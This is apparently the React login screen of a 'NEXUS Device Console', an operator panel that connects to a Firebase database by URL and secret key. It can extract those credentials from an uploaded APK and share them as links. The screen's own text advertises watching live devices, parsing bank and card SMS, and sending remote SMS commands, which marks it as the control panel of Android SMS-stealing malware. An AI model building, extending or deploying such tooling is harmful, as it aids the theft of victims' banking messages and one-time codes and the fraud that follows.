import { useEffect, useRef, useState } from 'react'
import {
  Link2,
  Loader2,
  LogIn,
  Trash2,
  Upload,
  Database,
  KeyRound,
  Share2,
  Clock,
} from 'lucide-react'
import type { SavedAccount } from '../lib/types'
import { loadAccounts, removeAccount, upsertAccount } from '../lib/storage'
import { decodeShareLink, encodeShareLink, extractFromApk, validateConnection } from '../lib/firebase'

interface Props {
  onConnect: (url: string, key: string) => void
  pushToast: (t: { type: 'success' | 'error' | 'info' | 'warn'; title: string; message?: string }) => void
}

export function LoginScreen({ onConnect, pushToast }: Props) {
  const [url, setUrl] = useState('')
  const [key, setKey] = useState('')
  const [busy, setBusy] = useState(false)
  const [accounts, setAccounts] = useState<SavedAccount[]>([])
  const [dragOver, setDragOver] = useState(false)
  const fileRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    setAccounts(loadAccounts())
    const shared = decodeShareLink(window.location.hash)
    if (shared) {
      setUrl(shared.url)
      setKey(shared.key)
      pushToast({ type: 'info', title: 'Shared connection loaded', message: 'Review and connect when ready.' })
    }
  }, [pushToast])

  async function handleConnect(e?: React.FormEvent) {
    e?.preventDefault()
    if (!url.trim() || !key.trim()) {
      pushToast({ type: 'warn', title: 'Missing credentials', message: 'Paste both Database URL and Secret / API key.' })
      return
    }
    setBusy(true)
    try {
      await validateConnection(url.trim(), key.trim())
      upsertAccount({ url: url.trim(), key: key.trim() })
      setAccounts(loadAccounts())
      onConnect(url.trim(), key.trim())
      pushToast({ type: 'success', title: 'Connected', message: 'Live device feed is online.' })
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Unknown error'
      if (msg === 'PERMISSION_DENIED') {
        pushToast({
          type: 'error',
          title: 'Permission denied',
          message: 'This endpoint needs the Database Secret (legacy) or a rule-allowed key. Check Firebase console rules.',
        })
      } else {
        pushToast({ type: 'error', title: 'Connection failed', message: msg })
      }
    } finally {
      setBusy(false)
    }
  }

  function useAccount(a: SavedAccount) {
    setUrl(a.url)
    setKey(a.key)
  }

  function handleDelete(id: string) {
    setAccounts(removeAccount(id))
  }

  function handleShare() {
    if (!url || !key) return
    const link = encodeShareLink(url, key)
    navigator.clipboard.writeText(link).then(() => {
      pushToast({ type: 'success', title: 'Link copied', message: 'Anyone with the link can open this connection.' })
    })
  }

  async function onFile(file: File) {
    if (!file.name.match(/\.(apk|zip)$/i)) {
      pushToast({ type: 'warn', title: 'Unsupported file', message: 'Drop an .apk or .zip.' })
      return
    }
    setBusy(true)
    try {
      const found = await extractFromApk(file)
      if (found.url) setUrl(found.url)
      if (found.key) setKey(found.key)
      if (found.url || found.key) {
        pushToast({ type: 'success', title: 'Extracted from package', message: 'Review the values before connecting.' })
      } else {
        pushToast({ type: 'warn', title: 'Nothing found', message: 'Could not locate Firebase URL or key in the binary.' })
      }
    } catch {
      pushToast({ type: 'error', title: 'Parse failed', message: 'Unable to read that file.' })
    } finally {
      setBusy(false)
    }
  }

  return (
    <div className="min-h-full flex flex-col lg:flex-row">
      {/* brand panel */}
      <div className="relative lg:w-[42%] bg-gradient-to-br from-slate-900 via-sky-950 to-slate-950 px-8 py-12 lg:py-16 flex flex-col justify-between overflow-hidden">
        <div className="absolute inset-0 opacity-[0.07] bg-[radial-gradient(circle_at_30%_20%,#38bdf8,transparent_50%),radial-gradient(circle_at_80%_80%,#6366f1,transparent_40%)]" />
        <div className="relative">
          <div className="flex items-center gap-3 mb-10">
            <div className="h-10 w-10 rounded-xl bg-sky-500/20 border border-sky-400/30 flex items-center justify-center">
              <Database className="h-5 w-5 text-sky-300" />
            </div>
            <div>
              <p className="text-lg font-semibold tracking-tight text-white">NEXUS</p>
              <p className="text-xs text-sky-300/80 font-medium tracking-wider uppercase">Device Console</p>
            </div>
          </div>
          <h1 className="text-3xl lg:text-4xl font-semibold text-white tracking-tight leading-tight max-w-sm">
            Remote device management, built for clarity.
          </h1>
          <p className="mt-4 text-slate-400 text-sm leading-relaxed max-w-sm">
            Connect a Firebase Realtime Database, watch live devices, bank SMS, and send commands — all client-side.
          </p>
        </div>
        <div className="relative mt-12 hidden lg:block">
          <div className="rounded-2xl border border-white/5 bg-white/[0.03] p-5 backdrop-blur-sm">
            <p className="text-xs text-slate-500 uppercase tracking-wider mb-3">What you get</p>
            <ul className="space-y-2 text-sm text-slate-300">
              <li className="flex gap-2"><span className="text-sky-400">▸</span> Live online / offline presence</li>
              <li className="flex gap-2"><span className="text-sky-400">▸</span> Bank & card SMS parsing</li>
              <li className="flex gap-2"><span className="text-sky-400">▸</span> Remote SMS via webhook events</li>
              <li className="flex gap-2"><span className="text-sky-400">▸</span> Shareable connection links</li>
            </ul>
          </div>
        </div>
      </div>

      {/* form panel */}
      <div className="flex-1 flex items-center justify-center px-6 py-12 lg:py-16">
        <div className="w-full max-w-md space-y-8">
          <div>
            <h2 className="text-xl font-semibold text-white">Connect database</h2>
            <p className="mt-1 text-sm text-slate-400">Paste credentials or extract from an APK package.</p>
          </div>

          <form onSubmit={handleConnect} className="space-y-4">
            <label className="block">
              <span className="text-xs font-medium text-slate-400 mb-1.5 flex items-center gap-1.5">
                <Database className="h-3.5 w-3.5" /> Database URL
              </span>
              <input
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                placeholder="https://your-project.firebaseio.com"
                className="w-full rounded-xl border border-slate-700 bg-slate-900/80 px-3.5 py-2.5 text-sm text-slate-100 placeholder:text-slate-600 focus:border-sky-500/60 focus:ring-1 focus:ring-sky-500/40 transition"
                autoComplete="off"
                spellCheck={false}
              />
            </label>
            <label className="block">
              <span className="text-xs font-medium text-slate-400 mb-1.5 flex items-center gap-1.5">
                <KeyRound className="h-3.5 w-3.5" /> Database Secret / API key
              </span>
              <input
                value={key}
                onChange={(e) => setKey(e.target.value)}
                type="password"
                placeholder="••••••••••••••••"
                className="w-full rounded-xl border border-slate-700 bg-slate-900/80 px-3.5 py-2.5 text-sm text-slate-100 placeholder:text-slate-600 focus:border-sky-500/60 focus:ring-1 focus:ring-sky-500/40 transition"
                autoComplete="off"
              />
            </label>

            {/* drop zone */}
            <div
              onDragOver={(e) => { e.preventDefault(); setDragOver(true) }}
              onDragLeave={() => setDragOver(false)}
              onDrop={(e) => {
                e.preventDefault()
                setDragOver(false)
                const f = e.dataTransfer.files?.[0]
                if (f) onFile(f)
              }}
              onClick={() => fileRef.current?.click()}
              className={`cursor-pointer rounded-xl border border-dashed px-4 py-5 text-center transition ${
                dragOver
                  ? 'border-sky-400 bg-sky-500/10'
                  : 'border-slate-700 bg-slate-900/40 hover:border-slate-600'
              }`}
            >
              <Upload className="mx-auto h-5 w-5 text-slate-500 mb-2" />
              <p className="text-xs text-slate-400">
                Drop <span className="text-slate-200">.apk / .zip</span> to auto-extract credentials
              </p>
              <input
                ref={fileRef}
                type="file"
                accept=".apk,.zip"
                className="hidden"
                onChange={(e) => {
                  const f = e.target.files?.[0]
                  if (f) onFile(f)
                }}
              />
            </div>

            <div className="flex gap-2 pt-1">
              <button
                type="submit"
                disabled={busy}
                className="flex-1 inline-flex items-center justify-center gap-2 rounded-xl bg-sky-500 hover:bg-sky-400 disabled:opacity-60 text-slate-950 font-semibold text-sm px-4 py-2.5 transition shadow-lg shadow-sky-500/20"
              >
                {busy ? <Loader2 className="h-4 w-4 animate-spin" /> : <LogIn className="h-4 w-4" />}
                Connect
              </button>
              <button
                type="button"
                onClick={handleShare}
                disabled={!url || !key}
                title="Copy shareable link"
                className="rounded-xl border border-slate-700 bg-slate-900 px-3 py-2.5 text-slate-300 hover:bg-slate-800 disabled:opacity-40 transition"
              >
                <Share2 className="h-4 w-4" />
              </button>
            </div>
          </form>

          {/* saved accounts */}
          {accounts.length > 0 && (
            <div>
              <p className="text-xs font-medium text-slate-500 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                <Clock className="h-3.5 w-3.5" /> Saved accounts
              </p>
              <ul className="space-y-2 max-h-48 overflow-y-auto">
                {accounts.map((a) => (
                  <li
                    key={a.id}
                    className="group flex items-center gap-3 rounded-xl border border-slate-800 bg-slate-900/60 px-3 py-2.5 hover:border-slate-700 transition"
                  >
                    <button onClick={() => useAccount(a)} className="min-w-0 flex-1 text-left">
                      <p className="text-sm text-slate-200 truncate font-medium">
                        {a.label || new URL(a.url.startsWith('http') ? a.url : `https://${a.url}`).hostname}
                      </p>
                      <p className="text-[11px] text-slate-500 truncate">{new Date(a.savedAt).toLocaleString()}</p>
                    </button>
                    <button
                      onClick={() => handleDelete(a.id)}
                      className="opacity-0 group-hover:opacity-100 p-1.5 rounded-lg text-slate-500 hover:text-rose-400 hover:bg-rose-500/10 transition"
                      aria-label="Remove"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  </li>
                ))}
              </ul>
            </div>
          )}

          <p className="text-[11px] text-slate-600 flex items-center gap-1.5">
            <Link2 className="h-3 w-3" /> Credentials stay in your browser. No backend.
          </p>
        </div>
      </div>
    </div>
  )
}
